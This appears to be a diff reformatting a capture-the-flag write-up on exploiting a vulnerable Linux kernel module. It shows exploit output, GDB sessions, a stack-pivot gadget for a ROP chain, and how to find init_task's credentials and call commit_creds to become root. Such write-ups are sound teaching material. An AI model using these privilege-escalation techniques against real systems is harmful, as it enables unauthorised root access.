@@ -76,7 +76,7 @@ After consulting with ChatGPT, I learned that this `private_data` pointer is jus
 
 This can easily be confirmed quickly by opening a file like `/proc/self/maps` and using its fd to read the `private_data` pointer using the module's `CMD_READ` command and comparing it with a regular file.
 
-```
+```bash
 ~ $ ./exploit
 Opening vulnerable device /dev/vuln.ko
 Opening /proc/self/maps (fd = 2)
@@ -91,12 +91,12 @@ So, this confirms that the `private_data` pointer for `/proc/self/maps` is indee
 With this knowledge, the next step is to figure out how to fake a `struct seq_file` to get the flag.
 
 The flag is mounted into the VM as a drive:
-```
+```bash
 -drive file=/tmp/flag.txt,format=raw,index=1
 ```
 
 It's available inside the VM as `/dev/sdb`
-```
+```bash
 ~ # whoami
 root
 ~ # cat /dev/sdb
@@ -283,15 +283,16 @@ When any of the `ops` functions are called, the first argument is always a point
 So, if we could find a gadget that can move the value of `rdi` into `rsp`, we could pivot the stack into a ROP chain.
 
 And surprisingly, there was this gadget in the kernel:
-```
-(remote) gef➤  x/6i 0xffffffff814b1a35
-   0xffffffff814b1a35:	push   rdi
-   0xffffffff814b1a36:	mov    ebx,0x415bfffa
-   0xffffffff814b1a3b:	pop    rsp
-   0xffffffff814b1a3c:	cdqe
-   0xffffffff814b1a3e:	pop    rbp
-   0xffffffff814b1a3f:	ret
-```
+<pre>
+<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">x/6i 0xffffffff814b1a35</span>
+   <span style="color:yellow">0xffffffff814b1a35</span>:	<span style="color:lightblue;font-weight:bold">push</span>   <span style="color:white">rdi</span>
+   <span style="color:yellow">0xffffffff814b1a36</span>:	<span style="color:lightblue;font-weight:bold">mov</span>    <span style="color:white">ebx</span>,<span style="color:orange">0x415bfffa</span>
+   <span style="color:yellow">0xffffffff814b1a3b</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rsp</span>
+   <span style="color:yellow">0xffffffff814b1a3c</span>:	<span style="color:lightblue;font-weight:bold">cdqe</span>
+   <span style="color:yellow">0xffffffff814b1a3e</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rbp</span>
+   <span style="color:yellow">0xffffffff814b1a3f</span>:	<span style="color:lightblue;font-weight:bold">ret</span>
+</pre>
+
 
 Which does exactly that.
 
@@ -324,24 +325,25 @@ The `struct task_struct` has two pointers to `struct cred` structures followed b
 Now, for the `init_task`, the comm is `swapper`.
 So if we search the memory in GDB for `swapper`, we can find the `real_cred` and `cred` pointers just before this string which give us the pointer to a `struct creds` for the `init` process which is running as root.
 
-```
-(remote) gef➤  search-pattern swapper
-[+] Searching 'swapper' in memory
-[+] In (0xffff888001a00000-0xffff888001caf000), permission=r--
-  0xffff888001c2533e - 0xffff888001c25345  →   "swapper"
-[+] In (0xffff888001caf000-0xffff8880020dc000), permission=rw-
-  0xffff888001e0ca50 - 0xffff888001e0ca59  →   "swapper/0"
-[+] In (0xffffffff81a00000-0xffffffff81caf000), permission=r--
-  0xffffffff81c2533e - 0xffffffff81c25345  →   "swapper"
-[+] In (0xffffffff81caf000-0xffffffff820dc000), permission=rw-
-  0xffffffff81e0ca50 - 0xffffffff81e0ca59  →   "swapper/0"
-(remote) gef➤  tele 0xffffffff81e0ca50-0x10
-0xffffffff81e0ca40│+0x0000: 0xffffffff81e3bf60  →  0x0000000000000004    <------ real_cred
-0xffffffff81e0ca48│+0x0008: 0xffffffff81e3bf60  →  0x0000000000000004    <------ cred
-0xffffffff81e0ca50│+0x0010: "swapper/0"                                  <------ comm
-0xffffffff81e0ca58│+0x0018: 0x0000000000000030 ("0"?)
-0xffffffff81e0ca60│+0x0020: 0x0000000000000000
-```
+<pre>
+<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">search-pattern swapper</span>
+<span style="color:gray">[+] Searching 'swapper' in memory</span>
+<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001a00000</span>-<span style="color:yellow">0xffff888001caf000</span><span style="color:gray">), permission=r--</span>
+  <span style="color:yellow">0xffff888001c2533e</span> - <span style="color:yellow">0xffff888001c25345</span>  →   <span style="color:lightblue">"swapper"</span>
+<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001caf000</span>-<span style="color:yellow">0xffff8880020dc000</span><span style="color:gray">), permission=rw-</span>
+  <span style="color:yellow">0xffff888001e0ca50</span> - <span style="color:yellow">0xffff888001e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
+<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81a00000</span>-<span style="color:yellow">0xffffffff81caf000</span><span style="color:gray">), permission=r--</span>
+  <span style="color:yellow">0xffffffff81c2533e</span> - <span style="color:yellow">0xffffffff81c25345</span>  →   <span style="color:lightblue">"swapper"</span>
+<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81caf000</span>-<span style="color:yellow">0xffffffff820dc000</span><span style="color:gray">), permission=rw-</span>
+  <span style="color:yellow">0xffffffff81e0ca50</span> - <span style="color:yellow">0xffffffff81e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
+<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">tele 0xffffffff81e0ca50-0x10</span>
+<span style="color:yellow">0xffffffff81e0ca40</span>│+0x0000: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ real_cred</span>
+<span style="color:yellow">0xffffffff81e0ca48</span>│+0x0008: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ cred</span>
+<span style="color:yellow">0xffffffff81e0ca50</span>│+0x0010: <span style="color:lightblue">"swapper/0"</span>                                  <span style="color:gray">&lt;------ comm</span>
+<span style="color:yellow">0xffffffff81e0ca58</span>│+0x0018: <span style="color:orange">0x0000000000000030</span> (<span style="color:lightblue">"0"?</span>)
+<span style="color:yellow">0xffffffff81e0ca60</span>│+0x0020: <span style="color:orange">0x0000000000000000</span>
+</pre>
+
 
 So, all we need to do is just call `commit_creds(0xffffffff81e3bf60)` to become root.
 
